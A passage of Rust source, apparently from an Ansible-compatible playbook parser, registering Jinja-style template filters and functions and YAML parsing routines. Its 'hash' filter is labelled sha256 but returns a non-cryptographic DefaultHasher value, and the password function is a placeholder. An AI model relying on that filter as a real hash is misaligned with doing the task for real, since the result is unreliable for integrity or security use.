word.chars();\n                    match chars.next() {\n                        None =\u003e String::new(),\n                        Some(c) =\u003e c\n                            .to_uppercase()\n                            .chain(chars.flat_map(|c| c.to_lowercase()))\n                            .collect(),\n                    }\n                })\n                .collect::\u003cVec\u003c_\u003e\u003e()\n                .join(\" \")\n        });\n        env.add_filter(\"trim\", |s: String| s.trim().to_string());\n        env.add_filter(\"strip\", |s: String| s.trim().to_string());\n\n        // Replace filter\n        env.add_filter(\"replace\", |s: String, from: String, to: String| {\n            s.replace(\u0026from, \u0026to)\n        });\n\n        // Split/join filters\n        env.add_filter(\"split\", |s: String, sep: Option\u003cString\u003e| -\u003e Vec\u003cString\u003e {\n            let sep = sep.unwrap_or_else(|| \" \".to_string());\n            s.split(\u0026sep).map(|s| s.to_string()).collect()\n        });\n\n        // Default filter\n        env.add_filter(\"default\", |value: Value, default: Value| -\u003e Value {\n            if value.is_undefined() || value.is_none() {\n                default\n            } else {\n                value\n            }\n        });\n        env.add_filter(\"d\", |value: Value, default: Value| -\u003e Value {\n            if value.is_undefined() || value.is_none() {\n                default\n            } else {\n                value\n            }\n        });\n\n        // Boolean filter\n        env.add_filter(\"bool\", |value: Value| -\u003e bool {\n            match value.as_str() {\n                Some(\"true\") | Some(\"yes\") | Some(\"on\") | Some(\"1\") =\u003e true,\n                Some(\"false\") | Some(\"no\") | Some(\"off\") | Some(\"0\") | Some(\"\") =\u003e false,\n                None =\u003e {\n                    if let Ok(b) = value.clone().try_into() {\n                        b\n                    } else if let Ok(n) = TryInto::\u003ci64\u003e::try_into(value) {\n                        n != 0\n                    } else {\n                        false\n                    }\n                }\n                _ =\u003e true,\n            }\n        });\n\n        // Int filter\n        env.add_filter(\"int\", |value: Value| -\u003e i64 {\n            if let Some(s) = value.as_str() {\n                s.parse().unwrap_or(0)\n            } else if let Ok(n) = value.clone().try_into() {\n                n\n            } else if let Ok(f) = TryInto::\u003cf64\u003e::try_into(value) {\n                f as i64\n            } else {\n                0\n            }\n        });\n\n        // Float filter\n        env.add_filter(\"float\", |value: Value| -\u003e f64 {\n            if let Some(s) = value.as_str() {\n                s.parse().unwrap_or(0.0)\n            } else if let Ok(n) = TryInto::\u003ci64\u003e::try_into(value.clone()) {\n                n as f64\n            } else if let Ok(f) = value.try_into() {\n                f\n            } else {\n                0.0\n            }\n        });\n\n        // String filter\n        env.add_filter(\"string\", |value: Value| -\u003e String { value.to_string() });\n\n        // Length filter\n        env.add_filter(\"length\", |value: Value| -\u003e usize {\n            if let Some(s) = value.as_str() {\n                s.len()\n            } else if let Some(seq) = value.as_seq() {\n                seq.len()\n            } else if let Some(obj) = value.as_object() {\n                obj.len()\n            } else {\n                0\n            }\n        });\n\n        // First/last filters\n        env.add_filter(\"first\", |value: Value| -\u003e Value {\n            if let Some(seq) = value.as_seq() {\n                seq.get_item(\u0026Value::from(0)).unwrap_or(Value::UNDEFINED)\n            } else if let Some(s) = value.as_str() {\n                s.chars()\n                    .next()\n                    .map(|c| Value::from(c.to_string()))\n                    .unwrap_or(Value::UNDEFINED)\n            } else {\n                Value::UNDEFINED\n            }\n        });\n\n        env.add_filter(\"last\", |value: Value| -\u003e Value {\n            if let Some(seq) = value.as_seq() {\n                let len = seq.len();\n                if len \u003e 0 {\n                    seq.get_item(\u0026Value::from(len - 1))\n                        .unwrap_or(Value::UNDEFINED)\n                } else {\n                    Value::UNDEFINED\n                }\n            } else if let Some(s) = value.as_str() {\n                s.chars()\n                    .last()\n                    .map(|c| Value::from(c.to_string()))\n                    .unwrap_or(Value::UNDEFINED)\n            } else {\n                Value::UNDEFINED\n            }\n        });\n\n        // Unique filter\n        env.add_filter(\"unique\", |value: Value| -\u003e Vec\u003cValue\u003e {\n            if let Some(seq) = value.as_seq() {\n                let mut seen = std::collections::HashSet::new();\n                let mut result = Vec::new();\n                for item in seq.iter() {\n                    let key = item.to_string();\n                    if seen.insert(key) {\n                        result.push(item);\n                    }\n                }\n                result\n            } else {\n                Vec::new()\n            }\n        });\n\n        // Sort filter\n        env.add_filter(\"sort\", |value: Value| -\u003e Vec\u003cValue\u003e {\n            if let Some(seq) = value.as_seq() {\n                let mut items: Vec\u003cValue\u003e = seq.iter().collect();\n                items.sort_by(|a, b| a.to_string().cmp(\u0026b.to_string()));\n                items\n            } else {\n                Vec::new()\n            }\n        });\n\n        // Reverse filter\n        env.add_filter(\"reverse\", |value: Value| -\u003e Value {\n            if let Some(seq) = value.as_seq() {\n                let items: Vec\u003cValue\u003e = seq.iter().rev().collect();\n                Value::from(items)\n            } else if let Some(s) = value.as_str() {\n                Value::from(s.chars().rev().collect::\u003cString\u003e())\n            } else {\n                value\n            }\n        });\n\n        // Flatten filter\n        env.add_filter(\"flatten\", |value: Value| -\u003e Vec\u003cValue\u003e {\n            fn flatten_recursive(value: \u0026Value, result: \u0026mut Vec\u003cValue\u003e) {\n                if let Some(seq) = value.as_seq() {\n                    for item in seq.iter() {\n                        flatten_recursive(\u0026item, result);\n                    }\n                } else {\n                    result.push(value.clone());\n                }\n            }\n\n            let mut result = Vec::new();\n            flatten_recursive(\u0026value, \u0026mut result);\n            result\n        });\n\n        // Map filter (select attribute)\n        env.add_filter(\"map\", |value: Value, attr: Option\u003cString\u003e| -\u003e Vec\u003cValue\u003e {\n            if let Some(seq) = value.as_seq() {\n                if let Some(attr) = attr {\n                    seq.iter()\n                        .filter_map(|item| {\n                            if let Some(obj) = item.as_object() {\n                                obj.get(\u0026Value::from(attr.clone()))\n                            } else {\n                                None\n                            }\n                        })\n                        .collect()\n                } else {\n                    seq.iter().collect()\n                }\n            } else {\n                Vec::new()\n            }\n        });\n\n        // Select filter\n        env.add_filter(\n            \"select\",\n            |value: Value, attr: Option\u003cString\u003e| -\u003e Vec\u003cValue\u003e {\n                if let Some(seq) = value.as_seq() {\n                    seq.iter()\n                        .filter(|item| {\n                            if let Some(ref attr) = attr {\n                                if let Some(obj) = item.as_object() {\n                                    obj.get(\u0026Value::from(attr.clone()))\n                                        .map(|v| v.is_true())\n                                        .unwrap_or(false)\n                                } else {\n                                    false\n                                }\n                            } else {\n                                item.is_true()\n                            }\n                        })\n                        .collect()\n                } else {\n                    Vec::new()\n                }\n            },\n        );\n\n        // Reject filter\n        env.add_filter(\n            \"reject\",\n            |value: Value, attr: Option\u003cString\u003e| -\u003e Vec\u003cValue\u003e {\n                if let Some(seq) = value.as_seq() {\n                    seq.iter()\n                        .filter(|item| {\n                            if let Some(ref attr) = attr {\n                                if let Some(obj) = item.as_object() {\n                                    !obj.get(\u0026Value::from(attr.clone()))\n                                        .map(|v| v.is_true())\n                                        .unwrap_or(false)\n                                } else {\n                                    true\n                                }\n                            } else {\n                                !item.is_true()\n                            }\n                        })\n                        .collect()\n                } else {\n                    Vec::new()\n                }\n            },\n        );\n\n        // JSON filters\n        env.add_filter(\"to_json\", |value: Value| -\u003e String {\n            serde_json::to_string(\u0026value).unwrap_or_else(|_| \"null\".to_string())\n        });\n\n        env.add_filter(\"to_nice_json\", |value: Value| -\u003e String {\n            serde_json::to_string_pretty(\u0026value).unwrap_or_else(|_| \"null\".to_string())\n        });\n\n        env.add_filter(\"from_json\", |s: String| -\u003e Value {\n            serde_json::from_str(\u0026s).unwrap_or(Value::UNDEFINED)\n        });\n\n        // YAML filters\n        env.add_filter(\"to_yaml\", |value: Value| -\u003e String {\n            serde_yaml::to_string(\u0026value).unwrap_or_else(|_| \"null\".to_string())\n        });\n\n        env.add_filter(\"from_yaml\", |s: String| -\u003e Value {\n            serde_yaml::from_str(\u0026s).unwrap_or(Value::UNDEFINED)\n        });\n\n        // Base64 filters\n        env.add_filter(\"b64encode\", |s: String| -\u003e String {\n            use base64::Engine;\n            base64::engine::general_purpose::STANDARD.encode(s.as_bytes())\n        });\n\n        env.add_filter(\"b64decode\", |s: String| -\u003e String {\n            use base64::Engine;\n            base64::engine::general_purpose::STANDARD\n                .decode(\u0026s)\n                .ok()\n                .and_then(|bytes| String::from_utf8(bytes).ok())\n                .unwrap_or_default()\n        });\n\n        // Regex filters\n        env.add_filter(\"regex_search\", |s: String, pattern: String| -\u003e bool {\n            regex::Regex::new(\u0026pattern)\n                .map(|re| re.is_match(\u0026s))\n                .unwrap_or(false)\n        });\n\n        env.add_filter(\n            \"regex_replace\",\n            |s: String, pattern: String, replacement: String| -\u003e String {\n                regex::Regex::new(\u0026pattern)\n                    .map(|re| re.replace_all(\u0026s, replacement.as_str()).to_string())\n                    .unwrap_or(s)\n            },\n        );\n\n        // Path filters\n        env.add_filter(\"basename\", |s: String| -\u003e String {\n            Path::new(\u0026s)\n                .file_name()\n                .and_then(|n| n.to_str())\n                .unwrap_or(\"\")\n                .to_string()\n        });\n\n        env.add_filter(\"dirname\", |s: String| -\u003e String {\n            Path::new(\u0026s)\n                .parent()\n                .and_then(|p| p.to_str())\n                .unwrap_or(\"\")\n                .to_string()\n        });\n\n        env.add_filter(\"expanduser\", |s: String| -\u003e String {\n            shellexpand::tilde(\u0026s).to_string()\n        });\n\n        env.add_filter(\"realpath\", |s: String| -\u003e String {\n            std::fs::canonicalize(\u0026s)\n                .ok()\n                .and_then(|p| p.to_str().map(|s| s.to_string()))\n                .unwrap_or(s)\n        });\n\n        // Hash filters\n        env.add_filter(\"hash\", |s: String, algorithm: Option\u003cString\u003e| -\u003e String {\n            use std::collections::hash_map::DefaultHasher;\n            use std::hash::{Hash, Hasher};\n\n            let algo = algorithm.unwrap_or_else(|| \"sha256\".to_string());\n            match algo.as_str() {\n                // For simplicity, use a basic hash for non-crypto purposes\n                // In production, you'd use proper crypto hash functions\n                _ =\u003e {\n                    let mut hasher = DefaultHasher::new();\n                    s.hash(\u0026mut hasher);\n                    format!(\"{:x}\", hasher.finish())\n                }\n            }\n        });\n\n        // Quote filter for shell\n        env.add_filter(\"quote\", |s: String| -\u003e String {\n            format!(\"'{}'\", s.replace('\\'', \"'\\\"'\\\"'\"))\n        });\n\n        // Comment filter\n        env.add_filter(\"comment\", |s: String, prefix: Option\u003cString\u003e| -\u003e String {\n            let prefix = prefix.unwrap_or_else(|| \"# \".to_string());\n            s.lines()\n                .map(|line| format!(\"{}{}\", prefix, line))\n                .collect::\u003cVec\u003c_\u003e\u003e()\n                .join(\"\\n\")\n        });\n\n        // Ternary filter\n        env.add_filter(\n            \"ternary\",\n            |condition: bool, true_val: Value, false_val: Value| -\u003e Value {\n                if condition {\n                    true_val\n                } else {\n                    false_val\n                }\n            },\n        );\n\n        // Combine filter for dicts\n        env.add_filter(\"combine\", |base: Value, other: Value| -\u003e Value {\n            if let (Some(base_obj), Some(other_obj)) = (base.as_object(), other.as_object()) {\n                let mut result = std::collections::BTreeMap::new();\n                for key in base_obj.keys() {\n                    if let Some(val) = base_obj.get(\u0026key) {\n                        result.insert(key.to_string(), val);\n                    }\n                }\n                for key in other_obj.keys() {\n                    if let Some(val) = other_obj.get(\u0026key) {\n                        result.insert(key.to_string(), val);\n                    }\n                }\n                Value::from_iter(result)\n            } else {\n                base\n            }\n        });\n\n        // Dict2items / items2dict\n        env.add_filter(\"dict2items\", |value: Value| -\u003e Vec\u003cValue\u003e {\n            if let Some(obj) = value.as_object() {\n                obj.iter()\n                    .map(|(k, v)| {\n                        Value::from_iter([(\"key\".to_string(), k), (\"value\".to_string(), v)])\n                    })\n                    .collect()\n            } else {\n                Vec::new()\n            }\n        });\n\n        // Type testing filters\n        env.add_filter(\"type_debug\", |value: Value| -\u003e String {\n            if value.is_undefined() {\n                \"undefined\".to_string()\n            } else if value.is_none() {\n                \"null\".to_string()\n            } else if value.as_str().is_some() {\n                \"string\".to_string()\n            } else if value.as_seq().is_some() {\n                \"list\".to_string()\n            } else if value.as_object().is_some() {\n                \"dict\".to_string()\n            } else if TryInto::\u003cbool\u003e::try_into(value.clone()).is_ok() {\n                \"bool\".to_string()\n            } else if TryInto::\u003ci64\u003e::try_into(value.clone()).is_ok() {\n                \"int\".to_string()\n            } else if TryInto::\u003cf64\u003e::try_into(value).is_ok() {\n                \"float\".to_string()\n            } else {\n                \"unknown\".to_string()\n            }\n        });\n\n        // Mandatory filter - fail if undefined\n        env.add_filter(\n            \"mandatory\",\n            |value: Value, msg: Option\u003cString\u003e| -\u003e Result\u003cValue, minijinja::Error\u003e {\n                if value.is_undefined() || value.is_none() {\n                    let message =\n                        msg.unwrap_or_else(|| \"Mandatory variable is undefined\".to_string());\n                    Err(minijinja::Error::new(\n                        minijinja::ErrorKind::UndefinedError,\n                        message,\n                    ))\n                } else {\n                    Ok(value)\n                }\n            },\n        );\n\n        // Random filter - select random element or generate random number\n        env.add_filter(\"random\", |value: Value| -\u003e Value {\n            use rand::Rng;\n            if let Some(seq) = value.as_seq() {\n                let len = seq.len();\n                if len \u003e 0 {\n                    let idx = rand::rngs::OsRng.gen_range(0..len);\n                    seq.get_item(\u0026Value::from(idx)).unwrap_or(Value::UNDEFINED)\n                } else {\n                    Value::UNDEFINED\n                }\n            } else if let Ok(max) = TryInto::\u003ci64\u003e::try_into(value) {\n                let n = rand::rngs::OsRng.gen_range(0..max);\n                Value::from(n)\n            } else {\n                Value::UNDEFINED\n            }\n        });\n\n        // Shuffle filter\n        env.add_filter(\"shuffle\", |value: Value| -\u003e Vec\u003cValue\u003e {\n            use rand::seq::SliceRandom;\n            if let Some(seq) = value.as_seq() {\n                let mut items: Vec\u003cValue\u003e = seq.iter().collect();\n                items.shuffle(\u0026mut rand::rngs::OsRng);\n                items\n            } else {\n                Vec::new()\n            }\n        });\n\n        // Regex findall filter\n        env.add_filter(\n            \"regex_findall\",\n            |s: String, pattern: String| -\u003e Vec\u003cString\u003e {\n                regex::Regex::new(\u0026pattern)\n                    .map(|re| re.find_iter(\u0026s).map(|m| m.as_str().to_string()).collect())\n                    .unwrap_or_default()\n            },\n        );\n\n        // Selectattr filter - filter items by attribute value\n        env.add_filter(\n            \"selectattr\",\n            |value: Value,\n             attr: String,\n             test: Option\u003cString\u003e,\n             test_val: Option\u003cValue\u003e|\n             -\u003e Vec\u003cValue\u003e {\n                if let Some(seq) = value.as_seq() {\n                    seq.iter()\n                        .filter(|item| {\n                            if let Some(obj) = item.as_object() {\n                                if let Some(attr_val) = obj.get(\u0026Value::from(attr.clone())) {\n                                    match test.as_deref() {\n                                        Some(\"equalto\") | Some(\"==\") | Some(\"eq\") =\u003e {\n                                            if let Some(ref tv) = test_val {\n                                                attr_val.to_string() == tv.to_string()\n                                            } else {\n                                                false\n                                            }\n                                        }\n                                        Some(\"defined\") =\u003e !attr_val.is_undefined(),\n                                        Some(\"undefined\") =\u003e attr_val.is_undefined(),\n                                        Some(\"none\") =\u003e attr_val.is_none(),\n                                        Some(\"true\") | Some(\"truthy\") =\u003e attr_val.is_true(),\n                                        Some(\"false\") | Some(\"falsy\") =\u003e !attr_val.is_true(),\n                                        None | Some(_) =\u003e attr_val.is_true(),\n                                    }\n                                } else {\n                                    false\n                                }\n                            } else {\n                                false\n                            }\n                        })\n                        .collect()\n                } else {\n                    Vec::new()\n                }\n            },\n        );\n\n        // Rejectattr filter - reject items by attribute value\n        env.add_filter(\n            \"rejectattr\",\n            |value: Value,\n             attr: String,\n             test: Option\u003cString\u003e,\n             test_val: Option\u003cValue\u003e|\n             -\u003e Vec\u003cValue\u003e {\n                if let Some(seq) = value.as_seq() {\n                    seq.iter()\n                        .filter(|item| {\n                            if let Some(obj) = item.as_object() {\n                                if let Some(attr_val) = obj.get(\u0026Value::from(attr.clone())) {\n                                    match test.as_deref() {\n                                        Some(\"equalto\") | Some(\"==\") | Some(\"eq\") =\u003e {\n                                            if let Some(ref tv) = test_val {\n                                                attr_val.to_string() != tv.to_string()\n                                            } else {\n                                                true\n                                            }\n                                        }\n                                        Some(\"defined\") =\u003e attr_val.is_undefined(),\n                                        Some(\"undefined\") =\u003e !attr_val.is_undefined(),\n                                        Some(\"none\") =\u003e !attr_val.is_none(),\n                                        Some(\"true\") | Some(\"truthy\") =\u003e !attr_val.is_true(),\n                                        Some(\"false\") | Some(\"falsy\") =\u003e attr_val.is_true(),\n                                        None | Some(_) =\u003e !attr_val.is_true(),\n                                    }\n                                } else {\n                                    true // No attribute = include in reject\n                                }\n                            } else {\n                                true\n                            }\n                        })\n                        .collect()\n                } else {\n                    Vec::new()\n                }\n            },\n        );\n\n        // Strftime filter - date formatting\n        env.add_filter(\n            \"strftime\",\n            |format: String, timestamp: Option\u003ci64\u003e| -\u003e String {\n                use chrono::{TimeZone, Utc};\n                let dt = if let Some(ts) = timestamp {\n                    Utc.timestamp_opt(ts, 0).single()\n                } else {\n                    Some(Utc::now())\n                };\n                dt.map(|d| d.format(\u0026format).to_string())\n                    .unwrap_or_default()\n            },\n        );\n\n        // Join filter with custom separator\n        env.add_filter(\"join\", |value: Value, sep: Option\u003cString\u003e| -\u003e String {\n            let separator = sep.unwrap_or_else(|| \"\".to_string());\n            if let Some(seq) = value.as_seq() {\n                seq.iter()\n                    .map(|v| v.to_string())\n                    .collect::\u003cVec\u003c_\u003e\u003e()\n                    .join(\u0026separator)\n            } else {\n                value.to_string()\n            }\n        });\n\n        // Set operations\n        env.add_filter(\"difference\", |value: Value, other: Value| -\u003e Vec\u003cValue\u003e {\n            if let (Some(seq1), Some(seq2)) = (value.as_seq(), other.as_seq()) {\n                let set2: std::collections::HashSet\u003cString\u003e =\n                    seq2.iter().map(|v| v.to_string()).collect();\n                seq1.iter()\n                    .filter(|v| !set2.contains(\u0026v.to_string()))\n                    .collect()\n            } else {\n                Vec::new()\n            }\n        });\n\n        env.add_filter(\"intersect\", |value: Value, other: Value| -\u003e Vec\u003cValue\u003e {\n            if let (Some(seq1), Some(seq2)) = (value.as_seq(), other.as_seq()) {\n                let set2: std::collections::HashSet\u003cString\u003e =\n                    seq2.iter().map(|v| v.to_string()).collect();\n                seq1.iter()\n                    .filter(|v| set2.contains(\u0026v.to_string()))\n                    .collect()\n            } else {\n                Vec::new()\n            }\n        });\n\n        env.add_filter(\"union\", |value: Value, other: Value| -\u003e Vec\u003cValue\u003e {\n            if let (Some(seq1), Some(seq2)) = (value.as_seq(), other.as_seq()) {\n                let mut seen = std::collections::HashSet::new();\n                let mut result = Vec::new();\n                for item in seq1.iter().chain(seq2.iter()) {\n                    let key = item.to_string();\n                    if seen.insert(key) {\n                        result.push(item);\n                    }\n                }\n                result\n            } else {\n                Vec::new()\n            }\n        });\n\n        env.add_filter(\n            \"symmetric_difference\",\n            |value: Value, other: Value| -\u003e Vec\u003cValue\u003e {\n                if let (Some(seq1), Some(seq2)) = (value.as_seq(), other.as_seq()) {\n                    let set1: std::collections::HashSet\u003cString\u003e =\n                        seq1.iter().map(|v| v.to_string()).collect();\n                    let set2: std::collections::HashSet\u003cString\u003e =\n                        seq2.iter().map(|v| v.to_string()).collect();\n                    let mut result = Vec::new();\n                    for item in seq1.iter() {\n                        if !set2.contains(\u0026item.to_string()) {\n                            result.push(item);\n                        }\n                    }\n                    for item in seq2.iter() {\n                        if !set1.contains(\u0026item.to_string()) {\n                            result.push(item);\n                        }\n                    }\n                    result\n                } else {\n                    Vec::new()\n                }\n            },\n        );\n\n        // Zip filter - combine lists\n        env.add_filter(\"zip\", |value: Value, other: Value| -\u003e Vec\u003cValue\u003e {\n            if let (Some(seq1), Some(seq2)) = (value.as_seq(), other.as_seq()) {\n                seq1.iter()\n                    .zip(seq2.iter())\n                    .map(|(a, b)| Value::from(vec![a, b]))\n                    .collect()\n            } else {\n                Vec::new()\n            }\n        });\n\n        // Min/Max filters\n        env.add_filter(\"min\", |value: Value| -\u003e Value {\n            if let Some(seq) = value.as_seq() {\n                seq.iter()\n                    .min_by(|a, b| a.to_string().cmp(\u0026b.to_string()))\n                    .unwrap_or(Value::UNDEFINED)\n            } else {\n                Value::UNDEFINED\n            }\n        });\n\n        env.add_filter(\"max\", |value: Value| -\u003e Value {\n            if let Some(seq) = value.as_seq() {\n                seq.iter()\n                    .max_by(|a, b| a.to_string().cmp(\u0026b.to_string()))\n                    .unwrap_or(Value::UNDEFINED)\n            } else {\n                Value::UNDEFINED\n            }\n        });\n\n        // Subelements filter\n        env.add_filter(\"subelements\", |value: Value, key: String| -\u003e Vec\u003cValue\u003e {\n            if let Some(seq) = value.as_seq() {\n                let mut result = Vec::new();\n                for item in seq.iter() {\n                    if let Some(obj) = item.as_object() {\n                        if let Some(sub) = obj.get(\u0026Value::from(key.clone())) {\n                            if let Some(sub_seq) = sub.as_seq() {\n                                for sub_item in sub_seq.iter() {\n                                    result.push(Value::from(vec![item.clone(), sub_item]));\n                                }\n                            }\n                        }\n                    }\n                }\n                result\n            } else {\n                Vec::new()\n            }\n        });\n\n        // Groupby filter\n        env.add_filter(\"groupby\", |value: Value, attr: String| -\u003e Vec\u003cValue\u003e {\n            if let Some(seq) = value.as_seq() {\n                let mut groups: indexmap::IndexMap\u003cString, Vec\u003cValue\u003e\u003e = indexmap::IndexMap::new();\n                for item in seq.iter() {\n                    let key = if let Some(obj) = item.as_object() {\n                        obj.get(\u0026Value::from(attr.clone()))\n                            .map(|v| v.to_string())\n                            .unwrap_or_default()\n                    } else {\n                        String::new()\n                    };\n                    groups.entry(key).or_default().push(item);\n                }\n                groups\n                    .into_iter()\n                    .map(|(k, v)| {\n                        Value::from_iter([\n                            (\"grouper\".to_string(), Value::from(k)),\n                            (\"list\".to_string(), Value::from(v)),\n                        ])\n                    })\n                    .collect()\n            } else {\n                Vec::new()\n            }\n        });\n    }\n\n    /// Add Ansible-compatible built-in functions\n    fn add_builtin_functions(env: \u0026mut Environment\u003c'static\u003e) {\n        // Range function\n        env.add_function(\n            \"range\",\n            |start: i64, end: Option\u003ci64\u003e, step: Option\u003ci64\u003e| -\u003e Vec\u003ci64\u003e {\n                let (actual_start, actual_end) = match end {\n                    Some(e) =\u003e (start, e),\n                    None =\u003e (0, start),\n                };\n                let step = step.unwrap_or(1);\n\n                if step == 0 {\n                    return Vec::new();\n                }\n\n                let mut result = Vec::new();\n                let mut current = actual_start;\n\n                if step \u003e 0 {\n                    while current \u003c actual_end {\n                        result.push(current);\n                        current += step;\n                    }\n                } else {\n                    while current \u003e actual_end {\n                        result.push(current);\n                        current += step;\n                    }\n                }\n\n                result\n            },\n        );\n\n        // Now function\n        env.add_function(\"now\", || -\u003e String {\n            chrono::Local::now().format(\"%Y-%m-%d %H:%M:%S\").to_string()\n        });\n\n        // Query/lookup function (simplified)\n        env.add_function(\n            \"query\",\n            |plugin: String, _args: Option\u003cValue\u003e| -\u003e Vec\u003cValue\u003e {\n                // This would need full implementation for each lookup plugin\n                match plugin.as_str() {\n                    _ =\u003e Vec::new(),\n                }\n            },\n        );\n\n        // Lookup function\n        env.add_function(\"lookup\", |plugin: String, args: Option\u003cValue\u003e| -\u003e Value {\n            // Simplified lookup - would need full plugin system\n            match plugin.as_str() {\n                \"env\" =\u003e {\n                    if let Some(Value::String(var)) = args.as_ref().and_then(|a| {\n                        if let Some(seq) = a.as_seq() {\n                            seq.get_item(\u0026Value::from(0)).ok()\n                        } else {\n                            Some(a.clone())\n                        }\n                    }) {\n                        std::env::var(\u0026var)\n                            .map(Value::from)\n                            .unwrap_or(Value::UNDEFINED)\n                    } else {\n                        Value::UNDEFINED\n                    }\n                }\n                _ =\u003e Value::UNDEFINED,\n            }\n        });\n\n        // Password lookup (returns placeholder)\n        env.add_function(\"password\", |_path: String| -\u003e String {\n            // In real implementation, this would generate/retrieve passwords\n            \"placeholder_password\".to_string()\n        });\n\n        // Omit function (for omitting parameters)\n        env.add_function(\"omit\", || -\u003e Value { Value::from(\"__omit_place_holder__\") });\n\n        // Undef function\n        env.add_function(\"undef\", || -\u003e Value { Value::UNDEFINED });\n    }\n\n    /// Parse a playbook from a file\n    pub fn parse_playbook\u003cP: AsRef\u003cPath\u003e\u003e(\u0026self, path: P) -\u003e ParseResult\u003cPlaybook\u003e {\n        let path = path.as_ref();\n        let content = std::fs::read_to_string(path)?;\n\n        let mut playbook = self.parse_playbook_str(\u0026content)?;\n        playbook.source_path = Some(path.to_path_buf());\n\n        Ok(playbook)\n    }\n\n    /// Parse a playbook from a string\n    pub fn parse_playbook_str(\u0026self, content: \u0026str) -\u003e ParseResult\u003cPlaybook\u003e {\n        let docs: Vec\u003cserde_yaml::Value\u003e = serde_yaml::from_str(content)?;\n\n        let mut playbook = Playbook::new();\n\n        for doc in docs {\n            if let serde_yaml::Value::Sequence(plays) = doc {\n                for play_value in plays {\n                    let play = self.parse_play(\u0026play_value)?;\n                    playbook.add_play(play);\n                }\n            } else if let serde_yaml::Value::Mapping(_) = doc {\n                // Single play\n                let play = self.parse_play(\u0026doc)?;\n                playbook.add_play(play);\n            }\n        }\n\n        Ok(playbook)\n    }\n\n    /// Parse a single play from YAML value\n    fn parse_play(\u0026self, value: \u0026serde_yaml::Value) -\u003e ParseResult\u003cPlay\u003e {\n        let play: Play = serde_yaml::from_value(value.clone())?;\n        Ok(play)\n    }\n\n    /// Parse a tasks file\n    pub fn parse_tasks\u003cP: AsRef\u003cPath\u003e\u003e(\u0026self, path: P) -\u003e ParseResult\u003cVec\u003cTask\u003e\u003e {\n        let content = std::fs::read_to_string(path)?;\n        self.parse_tasks_str(\u0026content)\n    }\n\n    /// Parse tasks from a string\n    pub fn parse_tasks_str(\u0026self, content: \u0026str) -\u003e ParseResult\u003cVec\u003cTask\u003e\u003e {\n        let tasks: Vec\u003cTask\u003e = serde_yaml::from_str(content)?;\n        Ok(tasks)\n    }\n\n    /// Parse a handlers file\n    pub fn parse_handlers\u003cP: AsRef\u003cPath\u003e\u003e(\u0026self, path: P) -\u003e ParseResult\u003cVec\u003cHandler\u003e\u003e {\n        let content = std::fs::read_to_string(path)?;\n        self.parse_handlers_str(\u0026content)\n    }\n\n    /// Parse handlers from a string\n    pub fn parse_handlers_str(\u0026self, content: \u0026str) -\u003e ParseResult\u003cVec\u003cHandler\u003e\u003e {\n        let handlers: Vec\u003cHandler\u003e = serde_yaml::from_str(content)?;\n        Ok(handlers)\n    }\n\n    /// Parse a variables file\n    pub fn parse_vars\u003cP: AsRef\u003cPath\u003e\u003e(\n        \u0026self,\n        path: P,\n    ) -\u003e ParseResult\u003cIndexMap\u003cString, serde_yaml::Value\u003e\u003e {\n        let content = std::fs::read_to_string(path)?;\n        self.parse_vars_str(\u0026content)\n    }\n\n    /// Parse variables from a string\n    pub fn parse_vars_str(\n        \u0026self,\n        content: \u0026str,\n    ) -\u003e ParseResult\u003cIndexMap\u003cString, serde_yaml::Value\u003e\u003e {\n        let vars: IndexMap\u003cString, serde_yaml::Value\u003e = serde_yaml::from_str(content)?;\n        Ok(vars)\n    }\n\n    /// Render a template string with variables\n    pub fn render_template(\n        \u0026self,\n        template: \u0026str,\n        vars: \u0026IndexMap\u003cString, serde_yaml::Value\u003e,\n    ) -\u003e ParseResult\u003cString\u003e {\n        // Convert vars to minijinja values\n        let context = yaml_to_minijinja_value(\u0026serde_yaml::Value::Mapping(\n            vars.iter()\n                .map(|(k, v)| (serde_yaml::Value::String(k.clone()), v.clone()))\n                .collect(),\n        ));\n\n        let result = self.template_env.render_str(template, context)?;\n        Ok(result)\n    }\n\n    /// Check if a string contains template expressions\n    pub fn has_template(\u0026self, s: \u0026str) -\u003e bool {\n        s.contains(\"{{\") || s.contains(\"{%\") || s.contains(\"{#\")\n    }\n\n    /// Render all template expressions in a YAML value\n    pub fn render_value(\n        \u0026self,\n        value: \u0026serde_yaml::Value,\n        vars: \u0026IndexMap\u003cString, serde_yaml::Value\u003e,\n    ) -\u003e ParseResult\u003cserde_yaml::Value\u003e {\n        match value {\n            serde_yaml::Value::String(s) =\u003e {\n                if self.has_template(s) {\n                    let rendered = self.render_template(s, vars)?;\n                    // Try to parse as YAML to get proper type\n                    if let Ok(parsed) = serde_yaml::from_str(\u0026rendered) {\n                        Ok(parsed)\n                    } else {\n                        Ok(serde_yaml::Value::String(rendered))\n                    }\n                } else {\n                    Ok(value.clone())\n                }\n            }\n            serde_yaml::Value::Sequence(seq) =\u003e {\n                let rendered: Result\u003cVec\u003c_\u003e, _\u003e =\n                    seq.iter().map(|v| self.render_value(v, vars)).collect();\n                Ok(serde_yaml::Value::Sequence(rendered?))\n            }\n            serde_yaml::Value::Mapping(map) =\u003e {\n                let mut rendered = serde_yaml::Mapping::new();\n                for (k, v) in map {\n                    let rendered_key = self.render_value(k, vars)?;\n                    let rendered_val = self.render_value(v, vars)?;\n                    rendered.insert(rendered_key, rendered_val);\n                }\n                Ok(serde_yaml::Value::Mapping(rendered))\n            }\n            _ =\u003e Ok(value.clone()),\n        }\n    }\n\n    /// Get the template environment for advanced usage\n    pub fn template_env(\u0026self) -\u003e \u0026Environment\u003c'static\u003e {\n        \u0026self.template_env\n    }\n\n    /// Get a mutable reference to the template environment\n    pub fn template_env_mut(\u0026mut self) -\u003e \u0026mut Environment\u003c'static\u003e {\n        \u0026mut self.template_env\n    }\n}\n\n/// Convert YAML value to minijinja Value\nfn yaml_to_minijinja_value(yaml: \u0026serde_yaml::Value) -\u003e Value {\n    match yaml {\n        serde_yaml::Value::Null =\u003e Value::from(()),\n        serde_yaml::Value::Bool(b) =\u003e Value::from(*b),\n        serde_yaml::Value::Number(n) =\u003e {\n            if let Some(i) = n.as_i64() {\n                Value::from(i)\n            } else if let Some(f) = n.as_f64() {\n                Value::from(f)\n            } else {\n                Value::from(0)\n            }\n        }\n        serde_yaml::Value::String(s) =\u003e Value::from(s.as_str()),\n        serde_yaml::Value::Sequence(seq) =\u003e {\n            Value::from(seq.iter().map(yaml_to_minijinja_value).collect::\u003cVec\u003c_\u003e\u003e())\n        }\n        serde_yaml::Value::Mapping(map) =\u003e {\n            let items: Vec\u003c(String, Value)\u003e = map\n                .iter()\n                .filter_map(|(k, v)| {\n                    if let serde_yaml::Value::String(key) = 